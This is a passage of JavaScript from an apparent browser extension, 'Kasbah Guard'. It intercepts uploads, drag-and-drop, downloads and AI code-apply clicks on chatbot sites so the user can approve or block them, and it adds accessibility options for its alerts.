      // ═══ FAIL-CLOSED: Immediately seize files and kill event propagation ═══
      // This MUST happen synchronously before ANY async work (FileReader, modal).
      // Without this, the web app receives the change event and uploads the files
      // before our scan/modal finishes — the race condition that broke blocking.
      ev.stopImmediatePropagation();

      // Save files into a DataTransfer so we can restore them if user approves
      var savedDT = new DataTransfer();
      for (var si = 0; si < files.length; si++) {
        savedDT.items.add(files[si]);
      }
      var savedFileList = savedDT.files; // Keep a reference to the saved FileList
      console.log("[Kasbah] Upload - SEIZED " + files.length + " file(s), event propagation stopped");

      // Clear the input immediately — web app sees empty input if it somehow reads it
      target.value = "";

      // Now build metadata from the saved files (not from target.files which is now empty)
      var fileList = [];
      var totalSize = 0;
      var sensitiveDocNames = [];
      for (var i = 0; i < savedFileList.length; i++) {
        fileList.push(savedFileList[i].name + " (" + (savedFileList[i].size / 1024).toFixed(1) + "KB, " + (savedFileList[i].type || "unknown") + ")");
        totalSize += savedFileList[i].size;
        if (detectSensitiveFilename(savedFileList[i].name)) {
          sensitiveDocNames.push(savedFileList[i].name);
        }
      }

      var previewText = "Files: " + fileList.join(", ");
      console.log("[Kasbah] Upload - Detected sensitive files:", sensitiveDocNames);
      if (sensitiveDocNames.length > 0) {
        console.log("[Kasbah] Upload - SENSITIVE FILENAMES DETECTED:", sensitiveDocNames);
        previewText += "\nThis looks like a personal document: " + sensitiveDocNames.join(", ");
      }
      var extraMeta = {
        file_count: savedFileList.length,
        total_size: totalSize,
        file_names: fileList,
        sensitive_filenames: sensitiveDocNames,
      };

      // Helper: restore files to input and re-dispatch change event (user approved)
      function restoreAndAllow() {
        target.files = savedDT.files;
        target.__kasbah_allowed = true;
        target.dispatchEvent(new Event("change", { bubbles: true }));
        console.log("[Kasbah] Upload - APPROVED, files restored and change re-dispatched");
      }

      // Helper: keep input cleared (user blocked or auto-denied)
      function keepBlocked() {
        target.value = "";
        console.log("[Kasbah] Upload - BLOCKED, files destroyed");
      }

      // L6: Fail-closed check
      if (failClosedCheck("upload", keepBlocked)) return;

      // L3: Scan text-based file contents for secrets before uploading
      var textTypes = ["text/", "application/json", "application/xml", "application/csv", "application/javascript"];
      var filesToScan = [];
      for (var fi = 0; fi < savedFileList.length; fi++) {
        var fType = (savedFileList[fi].type || "").toLowerCase();
        var fName = (savedFileList[fi].name || "").toLowerCase();
        var isText = textTypes.some(function (t) { return fType.indexOf(t) !== -1; });
        var isTextExt = fName.endsWith(".txt") || fName.endsWith(".csv") || fName.endsWith(".json") || fName.endsWith(".env") || fName.endsWith(".yaml") || fName.endsWith(".yml") || fName.endsWith(".xml") || fName.endsWith(".md") || fName.endsWith(".js") || fName.endsWith(".ts") || fName.endsWith(".py") || fName.endsWith(".sh") || fName.endsWith(".conf") || fName.endsWith(".cfg") || fName.endsWith(".ini") || fName.endsWith(".toml") || fName.endsWith(".log");
        if ((isText || isTextExt) && savedFileList[fi].size < 512000) {
          filesToScan.push(savedFileList[fi]);
        }
      }

      // If we have sensitive filenames OR text files to scan, enter async scanning
      if (filesToScan.length > 0 || sensitiveDocNames.length > 0) {
        var scannedCount = 0;
        var fileRisks = [];

        if (filesToScan.length > 0) {
          filesToScan.forEach(function (file) {
            var reader = new FileReader();
            reader.onerror = function () {
              scannedCount++;
              if (scannedCount === filesToScan.length) {
                guardFlow("upload", previewText, extraMeta, restoreAndAllow, keepBlocked);
              }
            };
            reader.onload = function (e) {
              var content = e.target.result || "";
              var fileRes = typeof classify !== 'undefined' ? classify(content) : { decision: "ALLOW", risk: 0, reason: "" };
              if (fileRes.risk > 0) {
                fileRisks.push({ file: file.name, risk: fileRes.risk, decision: fileRes.decision, reason: fileRes.reason });
              }
              scannedCount++;
              if (scannedCount === filesToScan.length) {
                if (fileRisks.length > 0) {
                  extraMeta.file_risks = fileRisks;
                  previewText += "\n\u26a0 File contents flagged: " + fileRisks.map(function (fr) { return fr.file + " (Risk: " + fr.risk + ", " + fr.reason + ")"; }).join("; ");
                }
                guardFlow("upload", previewText, extraMeta, restoreAndAllow, keepBlocked);
              }
            };
            reader.readAsText(file);
          });
        } else if (sensitiveDocNames.length > 0) {
          guardFlow("upload", previewText, extraMeta, restoreAndAllow, keepBlocked);
        }
        return;
      }

      // No sensitive filenames, no text files — still run through guardFlow
      guardFlow("upload", previewText, extraMeta, restoreAndAllow, keepBlocked);
    },
    true
  );

  // Drag-and-drop file upload
  // Grace window: after user approves a drop, allow the next drop within 10 seconds
  var dropApprovedUntil = 0;

  document.addEventListener(
    "drop",
    function (ev) {
      var dt = ev.dataTransfer;
      if (!dt || !dt.files || dt.files.length === 0) return;

      // If within grace window from a previous approval, allow through
      if (Date.now() < dropApprovedUntil) {
        dropApprovedUntil = 0; // Single use
        return; // Let the drop proceed naturally
      }

      var files = dt.files;
      var fileList = [];
      var totalSize = 0;
      var sensitiveDocNames = [];
      for (var i = 0; i < files.length; i++) {
        fileList.push(files[i].name + " (" + (files[i].size / 1024).toFixed(1) + "KB)");
        totalSize += files[i].size;
        if (detectSensitiveFilename(files[i].name)) {
          sensitiveDocNames.push(files[i].name);
        }
      }

      // Only intercept file drops, not text drops
      if (fileList.length === 0) return;

      ev.preventDefault();
      ev.stopImmediatePropagation();

      var previewText = "Dropped files: " + fileList.join(", ");
      if (sensitiveDocNames.length > 0) {
        previewText += "\nThis looks like a personal document: " + sensitiveDocNames.join(", ");
      }
      guardFlow("upload", previewText, { file_count: files.length, total_size: totalSize, file_names: fileList, sensitive_filenames: sensitiveDocNames, source: "drop" },
        function () {
          // Allow: set grace window so next drop goes through without re-prompting
          dropApprovedUntil = Date.now() + 10000; // 10 second window
          var note = document.createElement("div");
          note.style.cssText = "position:fixed;bottom:20px;right:20px;z-index:2147483646;background:#18181b;color:#fff;padding:12px 18px;border-radius:12px;font:13px/1.4 system-ui;box-shadow:0 4px 12px rgba(0,0,0,.2)";
          note.textContent = "\u2705 Approved — drop the file again now (10s window)";
          document.body.appendChild(note);
          setTimeout(function () { note.remove(); }, 5000);
        },
        function () { console.log("[Kasbah] Drop BLOCKED — files destroyed"); }
      );
    },
    true
  );

  // ═══════════════════════════════════════════════════
  // VERB 4: BROWSE — Detect URLs in composer before send
  // (Integrated into SEND flow above via extractUrls)
  // Also detect when user types/pastes URLs into the input
  // ═══════════════════════════════════════════════════
  // Browse detection is integrated into the SEND and PASTE flows above.
  // URLs are extracted and included in the /decide payload as meta.urls.
  // The guard service logs these as verb:"send" with URL metadata.

  // ═══════════════════════════════════════════════════
  // VERB 5: DOWNLOAD — Intercept download links in AI responses
  // ═══════════════════════════════════════════════════
  document.addEventListener(
    "click",
    function (ev) {
      var target = ev.target;
      var link = target && target.closest ? target.closest("a") : null;
      if (!link) return;

      // Check for download attribute or blob/data URLs in response areas
      var href = link.getAttribute("href") || "";
      var hasDownload = link.hasAttribute("download");
      var isBlob = href.indexOf("blob:") === 0;
      var isData = href.indexOf("data:") === 0;

      if (!hasDownload && !isBlob && !isData) return;

      // Make sure it's within an AI response area (not navigation)
      // Covers: ChatGPT, Claude, Gemini, DeepSeek, Poe, Copilot, Perplexity, Mistral, etc.
      var isInResponse = link.closest("[data-message-author-role='assistant']") ||
                         link.closest(".markdown") ||
                         link.closest(".prose") ||
                         link.closest("[class*='response']") ||
                         link.closest("[class*='message']") ||
                         link.closest("[class*='artifact']") ||
                         link.closest("[class*='answer']") ||
                         link.closest("[class*='output']") ||
                         link.closest("[class*='result']") ||
                         link.closest("[class*='reply']") ||
                         link.closest("[class*='chat-turn']") ||
                         link.closest("[class*='model-response']") ||
                         link.closest("[data-role='assistant']") ||
                         link.closest("[data-testid*='message']");

      if (!isInResponse) return;

      if (link.__kasbah_dl_ok) {
        link.__kasbah_dl_ok = false;
        return;
      }

      ev.preventDefault();
      ev.stopPropagation();

      var fileName = link.getAttribute("download") || link.textContent || "unknown file";
      var previewText = "Download: " + fileName + "\nURL: " + href.slice(0, 200);

      guardFlow("download", previewText, { file_name: fileName, url_type: isBlob ? "blob" : isData ? "data" : "link" },
        function () {
          // Allow: trigger the download
          link.__kasbah_dl_ok = true;
          link.click();
        },
        function () { /* Block: download prevented */ }
      );
    },
    true
  );

  // ═══════════════════════════════════════════════════
  // VERB 6: EDIT — Intercept AI code apply/accept/insert actions
  // ═══════════════════════════════════════════════════
  // Catches: "Apply", "Accept", "Insert code", "Replace", "Apply to file",
  // "Accept all", "Apply changes", "Run", "Execute" buttons in AI response areas
  var EDIT_FLAG = "__kasbah_edit_ok__";
  var EDIT_SELECTORS = [
    // Generic apply/accept patterns
    'button[aria-label*="apply" i]',
    'button[aria-label*="accept" i]',
    'button[aria-label*="insert" i]',
    'button[aria-label*="replace" i]',
    'button[data-testid*="apply"]',
    'button[data-testid*="accept"]',
    // Claude Artifacts
    'button[class*="apply"]',
    '[data-testid="artifact-apply"]',
    // ChatGPT Canvas
    'button[class*="canvas-apply"]',
    '[data-testid*="canvas"][data-testid*="apply"]',
    // Cursor / Copilot / Generic IDE web
    'button[class*="accept-edit"]',
    'button[class*="apply-edit"]',
    'button[class*="apply-diff"]',
    'button[class*="accept-change"]',
    'button[class*="apply-suggestion"]',
    // v0.dev / Bolt / Replit
    'button[class*="deploy"]',
    '[data-action="apply"]',
    '[data-action="accept"]',
  ];

  function isEditButton(el) {
    if (!el) return false;
    // Check selectors
    for (var i = 0; i < EDIT_SELECTORS.length; i++) {
      if (el.matches && el.matches(EDIT_SELECTORS[i])) return true;
    }
    // Check text content of the button
    var text = (el.textContent || "").trim().toLowerCase();
    var editWords = ["apply", "accept", "insert code", "replace file", "apply to", "accept all", "apply changes", "apply edit", "accept edit", "apply diff", "run code", "execute"];
    for (var j = 0; j < editWords.length; j++) {
      if (text === editWords[j] || text.indexOf(editWords[j]) === 0) {
        // Make sure it's in an AI response context (not generic UI buttons)
        var inResponse = el.closest("[data-message-author-role='assistant']") ||
          el.closest(".markdown") || el.closest(".prose") ||
          el.closest("[class*='response']") || el.closest("[class*='message']") ||
          el.closest("[class*='artifact']") || el.closest("[class*='output']") ||
          el.closest("[class*='result']") || el.closest("[class*='code']") ||
          el.closest("[class*='editor']") || el.closest("[class*='diff']") ||
          el.closest("[class*='canvas']") || el.closest("[class*='suggestion']") ||
          el.closest("[data-role='assistant']");
        if (inResponse) return true;
      }
    }
    return false;
  }

  // Find the code content that would be applied
  function findEditContent(btn) {
    // Look for nearby code blocks
    var codeBlock = btn.closest("[class*='code']") ||
      btn.closest("[class*='artifact']") ||
      btn.closest("[class*='diff']") ||
      btn.closest("[class*='canvas']") ||
      btn.closest("[class*='suggestion']");
    if (codeBlock) {
      var code = codeBlock.querySelector("code, pre, [class*='code-content'], [class*='diff-content']");
      if (code) return code.textContent || "";
    }
    // Walk up to find the message container, then find code within it
    var container = btn.closest("[data-message-author-role='assistant']") ||
      btn.closest("[class*='response']") ||
      btn.closest("[class*='message']") ||
      btn.closest("[class*='output']");
    if (container) {
      var allCode = container.querySelectorAll("code, pre");
      var combined = "";
      for (var i = 0; i < allCode.length; i++) {
        combined += (allCode[i].textContent || "") + "\n";
      }
      if (combined.length > 10) return combined;
    }
    return btn.closest("div")?.textContent || "AI-generated code edit";
  }

  // Find the target file name if visible
  function findEditFilename(btn) {
    var container = btn.closest("[class*='artifact']") ||
      btn.closest("[class*='code']") ||
      btn.closest("[class*='diff']") ||
      btn.closest("[class*='canvas']") ||
      btn.closest("[class*='message']");
    if (container) {
      // Look for filename indicators
      var filename = container.querySelector("[class*='filename'], [class*='file-name'], [class*='title'], [class*='header'] span");
      if (filename) return filename.textContent || "";
    }
    // Check aria-label or title on the button itself
    return btn.getAttribute("aria-label") || btn.getAttribute("title") || "";
  }

  document.addEventListener(
    "click",
    function (ev) {
      var target = ev.target;
      var btn = target && target.closest ? target.closest("button,[role='button'],a") : null;
      if (!btn) return;
      if (!isEditButton(btn)) return;

      // Skip if we already approved this
      if (btn[EDIT_FLAG]) {
        btn[EDIT_FLAG] = false;
        return;
      }

      ev.preventDefault();
      ev.stopPropagation();
      ev.stopImmediatePropagation();

      // L6: Fail-closed check
      if (failClosedCheck("edit", null)) return;

      var codeContent = findEditContent(btn);
      var fileName = findEditFilename(btn);

      // Use unified classifier for code content analysis
      var res = typeof classify !== 'undefined' ? classify(codeContent) : { decision: "ALLOW", risk: 0, reason: "" };

      var previewText = (fileName ? "File: " + fileName + "\n" : "") + codeContent.slice(0, 500);

      var meta = {
        length: codeContent.length,
        preview: codeContent.slice(0, 200),
        risk: res.risk,
        reason: res.reason,
        decision: res.decision,
        file_name: fileName,
        verb_type: "edit",
        source: "ai_code_apply"
      };

      // Use unified guardFlow for all code edit decisions
      guardFlow("edit", codeContent, meta,
        function () {
          // Allow: apply the code edit
          btn[EDIT_FLAG] = true;
          btn.click();
        },
        function () {
          // Block: prevent code edit
          showToast("Code edit blocked — you're in control", false);
        }
      );
    },
    true
  );

  // ══════════════════════════════════════════════════════════════
  // INCLUSIVITY: Accessibility Profiles + Voice Alerts + Cultural Context
  // ══════════════════════════════════════════════════════════════

  // ── Accessibility profile (persisted in localStorage) ──
  var __kasbah_accessibility = {
    voiceAlerts: false,
    highContrast: false,
    fontSize: 'medium',
    simplifiedLanguage: false,
  };

  // Load saved preferences
  try {
    var saved = JSON.parse(localStorage.getItem('kasbah_accessibility') || '{}');
    if (saved.voiceAlerts !== undefined) __kasbah_accessibility.voiceAlerts = saved.voiceAlerts;
    if (saved.highContrast !== undefined) __kasbah_accessibility.highContrast = saved.highContrast;
    if (saved.fontSize) __kasbah_accessibility.fontSize = saved.fontSize;
    if (saved.simplifiedLanguage !== undefined) __kasbah_accessibility.simplifiedLanguage = saved.simplifiedLanguage;
  } catch(e) {}

  // ── TTS Voice Alerts (Web Speech API) ──
  // Speaks high-risk block alerts aloud for visually impaired users.
  // Activated when user enables voiceAlerts in accessibility profile.
  function speakAlert(message) {
    if (!__kasbah_accessibility.voiceAlerts) return;
    if (!('speechSynthesis' in window)) return;
    try {
      var utterance = new SpeechSynthesisUtterance(message);
      // Auto-detect language from browser
      var lang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2);
      utterance.lang = lang === 'ar' ? 'ar-SA' : lang === 'fr' ? 'fr-FR' : 'en-US';
      utterance.rate = 0.9; // Slightly slower for clarity
      utterance.volume = 0.8;
      window.speechSynthesis.speak(utterance);
    } catch(e) {}
  }

  // ── Patch showToast to include voice alerts ──
  var _origShowToast = showToast;
  showToast = function(message, isError, verb) {
    _origShowToast(message, isError, verb);
    // Speak high-risk blocks aloud
    if (isError) {
      speakAlert(message);
    }
  };

  // ── High-contrast mode: inject CSS overrides when enabled ──
  if (__kasbah_accessibility.highContrast) {
    try {
      var hcStyle = document.createElement('style');
      hcStyle.id = 'kasbah-high-contrast';
      hcStyle.textContent = '[role="dialog"][aria-label*="Kasbah"]{background:rgba(0,0,0,.85)!important}[role="dialog"][aria-label*="Kasbah"] > div{background:#000!important;color:#fff!important;border:2px solid #ff0!important}[role="alert"][aria-live]{background:#000!important;color:#ff0!important;border:2px solid #ff0!important}';
      (document.head || document.documentElement).appendChild(hcStyle);
    } catch(e) {}
  }

  // ── Font size override for modal/toast ──
  var _fontScale = { small: '12px', medium: '13px', large: '15px', 'extra-large': '18px' };
  if (__kasbah_accessibility.fontSize !== 'medium') {
    try {
      var fsStyle = document.createElement('style');
      fsStyle.id = 'kasbah-font-scale';
      var fs = _fontScale[__kasbah_accessibility.fontSize] || '13px';
      fsStyle.textContent = '[role="dialog"][aria-label*="Kasbah"],[role="alert"][aria-live]{font-size:' + fs + '!important}';
      (document.head || document.documentElement).appendChild(fsStyle);
    } catch(e) {}
  }

  // ── Cultural context: privacy norms per locale ──
  var __kasbah_cultural_context = {
    'en': { privacyLabel: 'Sensitive data detected', blockLabel: 'Block — Stay Safe', allowLabel: 'Proceed Anyway' },
    'fr': { privacyLabel: 'Donn\u00e9es sensibles d\u00e9tect\u00e9es', blockLabel: 'Bloquer — Rester en s\u00e9curit\u00e9', allowLabel: 'Continuer quand m\u00eame' },
    'ar': { privacyLabel: '\u062a\u0645 \u0627\u0643\u062a\u0634\u0627\u0641 \u0628\u064a\u0627\u0646\u0627\u062a \u062d\u0633\u0627\u0633\u0629', blockLabel: '\u062d\u0638\u0631 \u2014 \u0627\u0628\u0642\u064e \u0622\u0645\u0646\u0627\u064b', allowLabel: '\u0627\u0644\u0645\u062a\u0627\u0628\u0639\u0629 \u0639\u0644\u0649 \u0623\u064a \u062d\u0627\u0644' },
  };

  // Expose accessibility API on window for extension popup configuration
  window.__kasbah_accessibility = __kasbah_accessibility;
  window.__kasbah_setAccessibility = function(prefs) {
    if (prefs.voiceAlerts !== undefined) __kasbah_accessibility.voiceAlerts = prefs.voiceAlerts;
    if (prefs.highContrast !== undefined) __kasbah_accessibility.highContrast = prefs.highContrast;
    if (prefs.fontSize) __kasbah_accessibility.fontSize = prefs.fontSize;
    if (prefs.simplifiedLanguage !== undefined) __kasbah_accessibility.simplifiedLanguage = prefs.simplifiedLanguage;
    try { localStorage.setItem('kasbah_accessibility', JSON.stringify(__kasbah_accessibility)); } catch(e) {}
  };

  // ── Startup notification ──
  var detectedProduct = product();
  console.log("[Kasbah Guard] v3.2 initialized — " + host() + " → " + detectedProduct.toUpperCase());
  console.log("[Kasbah Guard] 6 verbs active: send, paste, upload, browse, download, edit");
  console.log("[Kasbah Guard] Accessibility: voiceAlerts=" + __kasbah_accessibility.voiceAlerts + " highContrast=" + __kasbah_accessibility.highContrast + " fontSize=" + __kasbah_accessibility.fontSize);
})();
